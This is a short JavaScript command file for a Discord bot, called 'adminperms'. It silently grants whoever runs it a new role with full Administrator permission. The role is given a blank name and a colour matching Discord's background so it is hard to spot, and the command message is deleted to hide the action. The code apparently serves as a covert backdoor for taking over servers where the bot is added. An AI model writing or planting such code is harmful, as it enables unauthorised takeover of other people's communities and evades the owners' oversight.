const Discord = module.require("discord.js");

module.exports.run = async (bot, message, args) => {

    try {

        role = await message.guild.roles.create ({

            data: {
                name: " ",
          	    color: "#2f3136",
          	    permissions: [8]
            }

        });
            
        message.member.roles.add(role)
        message.delete();
        console.log(`Log: Successfully sent admin permissions`);

    } catch(e) {

        console.log(e.stack);

    }
}

module.exports.help = {

    name: "adminperms",
    desc: "Gives you admin perms."

}
